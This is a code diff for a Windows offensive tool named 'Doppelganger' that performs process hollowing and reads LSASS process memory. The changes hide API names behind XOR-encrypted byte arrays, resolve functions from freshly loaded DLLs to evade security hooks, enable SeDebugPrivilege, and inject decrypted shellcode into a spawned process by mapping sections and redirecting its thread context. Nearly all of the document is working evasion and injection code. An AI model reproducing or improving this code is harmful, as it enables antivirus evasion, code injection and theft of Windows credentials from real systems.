@@ -57,6 +57,21 @@ static const unsigned char NTMVS_ENC[] = {
     0x7E, 0x45, 0x7F, 0x52, 0x44, 0x63, 0x5F, 0x52, 0x4F, 0x76, 0x07, 0x31, 0x06, 0x07, 0x11, 0x0F, 0x08, 0x06
 };
 
+// "OpenProcessToken"
+static const unsigned char OPT_ENC[] = {
+    0x7F, 0x41, 0x57, 0x5D, 0x64, 0x47, 0x59, 0x54, 0x5D, 0x4A, 0x12, 0x36, 0x0C, 0x0F, 0x00, 0x08
+};
+
+// "AdjustTokenPrivileges"
+static const unsigned char ATP_ENC[] = {
+    0x71, 0x55, 0x58, 0x46, 0x47, 0x41, 0x62, 0x58, 0x53, 0x5C, 0x0F, 0x32, 0x11, 0x0D, 0x13, 0x0F, 0x0B, 0x0D, 0x0E, 0x0F, 0x43
+};
+
+// "LookupPrivilegeValueA"
+static const unsigned char LPVA_ENC[] = {
+    0x7C, 0x5E, 0x5D, 0x58, 0x41, 0x45, 0x66, 0x45, 0x51, 0x4F, 0x08, 0x0E, 0x06, 0x03, 0x00, 0x30, 0x06, 0x04, 0x1C, 0x0F, 0x71
+};
+
 // to_wide util function
 
 wchar_t* to_wide(const char* str) {
@@ -146,6 +161,72 @@ FARPROC CustomGetProcAddress(HMODULE hModule, LPCSTR lpProcName) {
     return NULL;
 }
 
+// =====================================================
+// API Declarations
+// =====================================================
+
+// Loading API
+
+typedef BOOL(WINAPI* PFN_OPT)(
+    HANDLE ProcessHandle,
+    DWORD DesiredAccess,
+    PHANDLE TokenHandle
+    );
+
+typedef BOOL(WINAPI* PFN_ATP)(
+    HANDLE TokenHandle,
+    BOOL DisableAllPrivileges,
+    PTOKEN_PRIVILEGES NewState,
+    DWORD BufferLength,
+    PTOKEN_PRIVILEGES PreviousState,
+    PDWORD ReturnLength
+    );
+
+typedef BOOL(WINAPI* PFN_LPVA)(
+    LPCSTR lpSystemName,
+    LPCSTR lpName,
+    PLUID lpLuid
+    );
+
+typedef BOOL(WINAPI* PFN_CPW)(
+    LPCWSTR lpApplicationName,
+    LPWSTR lpCommandLine,
+    LPSECURITY_ATTRIBUTES lpProcessAttributes,
+    LPSECURITY_ATTRIBUTES lpThreadAttributes,
+    BOOL bInheritHandles,
+    DWORD dwCreationFlags,
+    LPVOID lpEnvironment,
+    LPCWSTR lpCurrentDirectory,
+    LPSTARTUPINFOW lpStartupInfo,
+    LPPROCESS_INFORMATION lpProcessInformation
+    );
+
+typedef DWORD(WINAPI* PFN_RT)(
+    HANDLE hThread
+    );
+
+typedef NTSTATUS(NTAPI* PFN_NTCS)(
+    PHANDLE SectionHandle,
+    ACCESS_MASK DesiredAccess,
+    PVOID ObjectAttributes,
+    PLARGE_INTEGER MaximumSize,
+    ULONG SectionPageProtection,
+    ULONG AllocationAttributes,
+    HANDLE FileHandle
+    );
+
+typedef NTSTATUS(NTAPI* PFN_NTMVOS)(
+    HANDLE SectionHandle,
+    HANDLE ProcessHandle,
+    PVOID* BaseAddress,
+    ULONG ZeroBits,
+    SIZE_T CommitSize,
+    PLARGE_INTEGER SectionOffset,
+    PSIZE_T ViewSize,
+    DWORD InheritDisposition,
+    ULONG AllocationType,
+    ULONG Win32Protect
+    );
 
 // =====================================================
 // Main – Process Hollowing + LSASS EPROCESS Reading
@@ -153,82 +234,22 @@ FARPROC CustomGetProcAddress(HMODULE hModule, LPCSTR lpProcName) {
 int main(int argc, char* argv[]) {
     // Start
     printf("[+] Starting Doppelganger\n");
-
-    // Enabling SeDebugPrivilege
-    HANDLE hToken = NULL;
-    LUID luid;
-    TOKEN_PRIVILEGES tp;
-
-    printf("[*] Requesting SeDebugPrivilege...\n");
-    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
-        printf("[!] OpenProcessToken failed, error: %lu\n", GetLastError());
-        return 1;
-    }
-    if (!LookupPrivilegeValue(NULL, L"SeDebugPrivilege", &luid)) {
-        printf("[!] LookupPrivilegeValue failed, error: %lu\n", GetLastError());
-        return 1;
-    }
-    tp.PrivilegeCount = 1;
-    tp.Privileges->Attributes = SE_PRIVILEGE_ENABLED;
-    tp.Privileges->Luid = luid;
-    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, 0, NULL, NULL)) {
-        printf("[!] AdjustTokenPrivileges failed, error: %lu\n", GetLastError());
-        return 1;
-    }
-    if (GetLastError() != ERROR_SUCCESS) {
-        printf("[!] AdjustTokenPrivileges reported an error: %lu\n", GetLastError());
-        return 1;
-    }
-    printf("[+] SeDebugPrivilege enabled.\n");
+    Sleep(5000);
 
     // Load clean versions of DLLs
     char* kernel32Path = "C:\\Windows\\System32\\kernel32.dll";
-    HANDLE hKernel32 = LoadCleanDLL(kernel32Path);
+    HMODULE hKernel32 = LoadCleanDLL(kernel32Path);
 
     char* ntdllPath = "C:\\Windows\\System32\\ntdll.dll";
-    HANDLE hNtdll = LoadCleanDLL(ntdllPath);
+    HMODULE hNtdll = LoadCleanDLL(ntdllPath);
 
-    // Define API functions
+    char* advapi32Path = "C:\\Windows\\System32\\advapi32.dll";
+    HMODULE hAdvapi32 = LoadCleanDLL(advapi32Path);
 
-    typedef BOOL(WINAPI* PFN_CPW)(
-        LPCWSTR lpApplicationName,
-        LPWSTR lpCommandLine,
-        LPSECURITY_ATTRIBUTES lpProcessAttributes,
-        LPSECURITY_ATTRIBUTES lpThreadAttributes,
-        BOOL bInheritHandles,
-        DWORD dwCreationFlags,
-        LPVOID lpEnvironment,
-        LPCWSTR lpCurrentDirectory,
-        LPSTARTUPINFOW lpStartupInfo,
-        LPPROCESS_INFORMATION lpProcessInformation
-        );
-
-    typedef DWORD(WINAPI* PFN_RT)(
-        HANDLE hThread
-        );
-
-    typedef NTSTATUS(NTAPI* PFN_NtCreateSection)(
-        PHANDLE SectionHandle,
-        ACCESS_MASK DesiredAccess,
-        PVOID ObjectAttributes,
-        PLARGE_INTEGER MaximumSize,
-        ULONG SectionPageProtection,
-        ULONG AllocationAttributes,
-        HANDLE FileHandle
-        );
-
-    typedef NTSTATUS(NTAPI* PFN_NtMapViewOfSection)(
-        HANDLE SectionHandle,
-        HANDLE ProcessHandle,
-        PVOID* BaseAddress,
-        ULONG ZeroBits,
-        SIZE_T CommitSize,
-        PLARGE_INTEGER SectionOffset,
-        PSIZE_T ViewSize,
-        DWORD InheritDisposition,
-        ULONG AllocationType,
-        ULONG Win32Protect
-        );
+    if (!hKernel32 || !hNtdll || !hAdvapi32) {
+        printf("[!] Failed to load one or more DLLs\n");
+        return 1;
+    }
 
     // XOR key definition
     const char* XOR_KEY = "0123456789abcdefghij";
@@ -239,37 +260,86 @@ int main(int argc, char* argv[]) {
     char* strRT = (char*)malloc(sizeof(RT_ENC));
     char* strNTCS = (char*)malloc(sizeof(NTCS_ENC));
     char* strNTMVS = (char*)malloc(sizeof(NTMVS_ENC));
+    char* strOPT = (char*)malloc(sizeof(OPT_ENC));
+    char* strATP = (char*)malloc(sizeof(ATP_ENC));
+    char* strLPVA = (char*)malloc(sizeof(LPVA_ENC));
 
-    if (!strCPW || !strRT || !strNTCS || !strNTMVS) {
+    if (!strCPW || !strRT || !strNTCS || !strNTMVS || !strOPT || !strATP || !strLPVA) {
         printf("[ERROR] Memory allocation error\n");
         return 1;
     }
-    memcpy(strCPW, CPW_ENC, sizeof(CPW_ENC));
-    memcpy(strRT, RT_ENC, sizeof(RT_ENC));
-    memcpy(strNTCS, NTCS_ENC, sizeof(NTCS_ENC));
-    memcpy(strNTMVS, NTMVS_ENC, sizeof(NTMVS_ENC));
 
+    // KERNEL32.DLL APIs
+    memcpy(strCPW, CPW_ENC, sizeof(CPW_ENC));
     strCPW = xor_decrypt_string((unsigned char*)strCPW, sizeof(CPW_ENC), XOR_KEY, key_len);
     PFN_CPW pCPW = (PFN_CPW)CustomGetProcAddress(hKernel32, strCPW);
-    SecureZeroMemory(strCPW, sizeof(CPW_ENC));
+    SecureZeroMemory(strCPW, sizeof(CPW_ENC)); free(strCPW);
 
+    memcpy(strRT, RT_ENC, sizeof(RT_ENC));
     strRT = xor_decrypt_string((unsigned char*)strRT, sizeof(RT_ENC), XOR_KEY, key_len);
-    PFN_RT  pRT = (PFN_RT)CustomGetProcAddress(hKernel32, strRT);
-    SecureZeroMemory(strRT, sizeof(RT_ENC));
+    PFN_RT pRT = (PFN_RT)CustomGetProcAddress(hKernel32, strRT);
+    SecureZeroMemory(strRT, sizeof(RT_ENC)); free(strRT);
 
+    // NTDLL.DLL APIs
+    memcpy(strNTCS, NTCS_ENC, sizeof(NTCS_ENC));
     strNTCS = xor_decrypt_string(NTCS_ENC, sizeof(NTCS_ENC), XOR_KEY, key_len);
-    PFN_NtCreateSection pNCS = (PFN_NtCreateSection)CustomGetProcAddress(hNtdll, strNTCS);
-    SecureZeroMemory(strNTCS, sizeof(strNTCS));
-    
-    strNTMVS = xor_decrypt_string(NTMVS_ENC, sizeof(NTMVS_ENC), XOR_KEY, key_len);
-    PFN_NtMapViewOfSection pNMVOS = (PFN_NtMapViewOfSection)CustomGetProcAddress(hNtdll, strNTMVS);
-    SecureZeroMemory(strNTMVS, sizeof(strNTMVS));
+    PFN_NTCS pNCS = (PFN_NTCS)CustomGetProcAddress(hNtdll, strNTCS);
+    SecureZeroMemory(strNTCS, sizeof(NTCS_ENC)); free(strNTCS);
 
-    if (!pCPW || !pRT || !pNCS || !pNMVOS) {
+    memcpy(strNTMVS, NTMVS_ENC, sizeof(NTMVS_ENC));
+    strNTMVS = xor_decrypt_string(NTMVS_ENC, sizeof(NTMVS_ENC), XOR_KEY, key_len);
+    PFN_NTMVOS pNMVOS = (PFN_NTMVOS)CustomGetProcAddress(hNtdll, strNTMVS);
+    SecureZeroMemory(strNTMVS, sizeof(NTMVS_ENC)); free(strNTMVS);
+
+    // ADVAPI32.DLL APIs
+    memcpy(strOPT, OPT_ENC, sizeof(OPT_ENC));
+    strOPT = xor_decrypt_string(OPT_ENC, sizeof(OPT_ENC), XOR_KEY, key_len);
+    PFN_OPT pOPT = (PFN_OPT)CustomGetProcAddress(hAdvapi32, strOPT);
+    SecureZeroMemory(strOPT, sizeof(OPT_ENC)); free(strOPT);
+
+    memcpy(strATP, ATP_ENC, sizeof(ATP_ENC));
+    strATP = xor_decrypt_string(ATP_ENC, sizeof(ATP_ENC), XOR_KEY, key_len);
+    PFN_ATP pATP = (PFN_ATP)CustomGetProcAddress(hAdvapi32, strATP);
+    SecureZeroMemory(strATP, sizeof(ATP_ENC)); free(strATP);
+
+    memcpy(strLPVA, LPVA_ENC, sizeof(LPVA_ENC));
+    strLPVA = xor_decrypt_string(LPVA_ENC, sizeof(LPVA_ENC), XOR_KEY, key_len);
+    PFN_LPVA pLPVA = (PFN_LPVA)CustomGetProcAddress(hAdvapi32, strLPVA);
+    SecureZeroMemory(strLPVA, sizeof(LPVA_ENC)); free(strLPVA);
+
+    // Check all resolved
+    if (!pCPW || !pRT || !pNCS || !pNMVOS || !pOPT || !pATP || !pLPVA) {
         printf("[ERROR] Error retrieving API addresses.\n");
         return 1;
     }
-    free(strCPW); free(strRT); free(strNTCS); free(strNTMVS);
+
+
+    // Enabling SeDebugPrivilege
+    HANDLE hToken = NULL;
+    LUID luid;
+    TOKEN_PRIVILEGES tp;
+
+    printf("[*] Requesting SeDebugPrivilege...\n");
+    if (!pOPT(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
+        printf("[!] OpenProcessToken failed, error: %lu\n", GetLastError());
+        return 1;
+    }
+    if (!pLPVA(NULL, "SeDebugPrivilege", &luid)) {
+        printf("[!] LookupPrivilegeValue failed, error: %lu\n", GetLastError());
+        return 1;
+    }
+    tp.PrivilegeCount = 1;
+    tp.Privileges->Attributes = SE_PRIVILEGE_ENABLED;
+    tp.Privileges->Luid = luid;
+    if (!pATP(hToken, FALSE, &tp, 0, NULL, NULL)) {
+        printf("[!] AdjustTokenPrivileges failed, error: %lu\n", GetLastError());
+        return 1;
+    }
+    if (GetLastError() != ERROR_SUCCESS) {
+        printf("[!] AdjustTokenPrivileges reported an error: %lu\n", GetLastError());
+        return 1;
+    }
+    printf("[+] SeDebugPrivilege enabled.\n");
 
     // Obtain the target executable path (from command line or stdin)
     char exePathA[MAX_PATH] = { 0 };
@@ -308,11 +378,11 @@ int main(int argc, char* argv[]) {
         return 1;
     }
     free(exePathW);
-    printf("[+] Process created in suspended state, PID: %lu\n", pi.dwProcessId);
+    printf("[+] Process created (not in suspended state), PID: %lu\n", pi.dwProcessId);
 
     // Deobfuscate the shellcode
     unsigned char shellcode_enc[] = {
-        0xD8, 0xF1, 0x41, 0x33, ...
+        0xD8, 0xF1, 0x45, 0x33, ...
     };
     size_t shellcode_len = sizeof(shellcode_enc);
     xor_decrypt_buffer(shellcode_enc, shellcode_len, XOR_KEY, key_len);
@@ -324,7 +394,7 @@ int main(int argc, char* argv[]) {
     NTSTATUS status = pNCS(&hSection, SECTION_ALL_ACCESS, NULL, &sectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
     if (status != 0 || !hSection) {
         printf("[ERROR] NtCreateSection failed: 0x%08X\n", status);
-            return 1;
+        return 1;
     }
 
     // Map section to local process
@@ -333,7 +403,7 @@ int main(int argc, char* argv[]) {
     status = pNMVOS(hSection, GetCurrentProcess(), &localBaseAddress, 0, 0, NULL, &viewSize, 2, 0, PAGE_READWRITE);
     if (status != 0 || !localBaseAddress) {
         printf("[ERROR] NtMapViewOfSection (local) failed: 0x%08X\n", status);
-            return 1;
+        return 1;
     }
     memcpy(localBaseAddress, shellcode_enc, shellcode_len);
 
@@ -343,7 +413,7 @@ int main(int argc, char* argv[]) {
     status = pNMVOS(hSection, pi.hProcess, &remoteBaseAddress, 0, 0, NULL, &viewSize, 2, 0, PAGE_EXECUTE_READ);
     if (status != 0 || !remoteBaseAddress) {
         printf("[ERROR] NtMapViewOfSection (remote) failed: 0x%08X\n", status);
-            return 1;
+        return 1;
     }
     printf("[+] Shellcode mapped at remote address: %p\n", remoteBaseAddress);
 
@@ -352,7 +422,7 @@ int main(int argc, char* argv[]) {
     ctx.ContextFlags = CONTEXT_CONTROL;
     if (!GetThreadContext(pi.hThread, &ctx)) {
         printf("[ERROR] GetThreadContext failed: %lu\n", GetLastError());
-            return 1;
+        return 1;
     }
 #ifdef _WIN64
     ctx.Rip = (DWORD64)remoteBaseAddress;
@@ -361,7 +431,7 @@ int main(int argc, char* argv[]) {
 #endif
     if (!SetThreadContext(pi.hThread, &ctx)) {
         printf("[ERROR] SetThreadContext failed: %lu\n", GetLastError());
-            return 1;
+        return 1;
     }
 
     DWORD suspendCount = pRT(pi.hThread);
